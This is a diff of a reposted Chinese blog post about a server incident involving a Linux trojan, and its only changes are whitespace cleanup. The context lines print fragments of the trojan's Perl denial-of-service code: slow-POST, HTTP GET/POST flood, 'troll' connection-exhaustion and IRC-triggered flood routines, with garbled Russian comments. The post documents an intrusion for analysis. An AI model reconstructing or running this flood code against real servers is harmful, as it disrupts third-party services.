@@ -4,7 +4,7 @@ layout: post
 slug: zt-an-experience-of-server-anti-ddos
 title: "[ZT]记一次运维，一个 Linux 木马"
 description: ""
-category: 
+category:
 tags: [ddos, server]
 ---
 {% include JB/setup %}
@@ -30,25 +30,25 @@ Galaxy看到注释中有<code>#id3|slowpost|ya3.ru|3128|/index.html</code>，就
 sub sendSlowPostRequest {
 	my $host = $_[0];
 	my $port = $_[1];
-	my $path = $_[2];	
-	my $contentLen = $_[3];	
+	my $path = $_[2];
+	my $contentLen = $_[3];
 	my $chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+|\=-~`1234567890";
-	
+
 	print "start\n";
-	
+
 	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
 	$iaddr = inet_aton($host);
 	$paddr = sockaddr_in($port, $iaddr);
 	connect(SOCK, $paddr);
-	
+
 	#send header
-	send (SOCK, "POST ".$path." HTTP/1.1\r\n", 0);	
-	send (SOCK, "Host: $host\r\n", 0);	
-	send (SOCK, "User-Agent: $ua\r\n", 0);	
-	send (SOCK, "Content-type: application/x-www-form-urlencoded\r\n", 0);	
-	send (SOCK, "Content-length: $contentLen\r\n", 0);	
-	send (SOCK, "\r\n", 0);	
-	
+	send (SOCK, "POST ".$path." HTTP/1.1\r\n", 0);
+	send (SOCK, "Host: $host\r\n", 0);
+	send (SOCK, "User-Agent: $ua\r\n", 0);
+	send (SOCK, "Content-type: application/x-www-form-urlencoded\r\n", 0);
+	send (SOCK, "Content-length: $contentLen\r\n", 0);
+	send (SOCK, "\r\n", 0);
+
 	#send body
 	for my $i (1..$contentLen){
 		my $symbol = substr $chars, int rand length($chars), 1;
@@ -76,21 +76,21 @@ sub sendSlowPostRequest {
 sub sendGetRequest {
 	my $host = $_[0];
 	my $port = $_[1];
-	my $path = $_[2];	
+	my $path = $_[2];
 
 #хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами, текстовый буффер дл¤ отсылки в теле ѕќ—“а
 # Host, port, path to the script, the time ¤ ¤ timeout between requests, the text buffer dl ¤ ѕќ references in the body, "a
-sub sendPostRequest {	
+sub sendPostRequest {
 	my $host = $_[0];
 	my $port = $_[1];
-	my $path = $_[2];	
-	my $content = $_[3];	
+	my $path = $_[2];
+	my $content = $_[3];
 
 # HTTP GET (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами)
 # HTTP GET (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests)
-sub attackHttpGet {		
+sub attackHttpGet {
 	$child = fork;
-	if ($child == 0){								
+	if ($child == 0){
 		my $host = $_[0];
 		my $port = $_[1];
 		my $path = $_[2];
@@ -99,9 +99,9 @@ sub attackHttpGet {
 
 # ѕќ—“ атака (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами, текстовый буффер дл¤ отсылки в теле ѕќ—“а)
 # Ѕќ-"attack (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests, the text buffer dl ¤ ѕќ references in the body-" a)
-sub attackHttpPost {	
+sub attackHttpPost {
 	$child = fork;
-	if ($child == 0){								
+	if ($child == 0){
 		my $host = $_[0];
 		my $port = $_[1];
 		my $path = $_[2];
@@ -109,9 +109,9 @@ sub attackHttpPost {
 		my $content = $_[4];
 		my $duration = $_[5];
 
-# TROLL атака (парамерты : хост, порт, кол-во коннектов на 1 поток, слип). если порт 0, то порт рандом. 
+# TROLL атака (парамерты : хост, порт, кол-во коннектов на 1 поток, слип). если порт 0, то порт рандом.
 # TROLL attack (paramerty: host, port, number of connections in a thread, slip). if the port is 0, the random port.
-sub attackTroll {	
+sub attackTroll {
 	$child = fork;
 	if ($child == 0){
 		my $host = $_[0];
@@ -122,20 +122,20 @@ sub attackTroll {
 
 # TCP атака. тоже что и тролл, но с посылкой мусора в порт после коннекта. доп.параметр : максимальный размер мусорного реквеста.
 # TCP attack. Same as trolley buses, but with sending debris into port after connect. dop.parametr: the maximum size of a garbage rekvesta.
-sub attackTcpTroll {	
+sub attackTcpTroll {
 	$child = fork;
-	if ($child == 0){			
+	if ($child == 0){
 		my $host = $_[0];
 		my $port = $_[1];
 		my $connects = $_[2];
 		my $maxLen = $_[3];
-		my $duration = $_[4];				
+		my $duration = $_[4];
 
 # HTTP from IRC (парамерты : хост, длительность)
 # HTTP from IRC (paramerty: host, duration)
-sub attackHttpFlood {		
+sub attackHttpFlood {
 	$child = fork;
-	if ($child == 0){	
+	if ($child == 0){
 		my $host = $_[0];
-		my $duration = $_[1];	
+		my $duration = $_[1];
 {% endhighlight %}
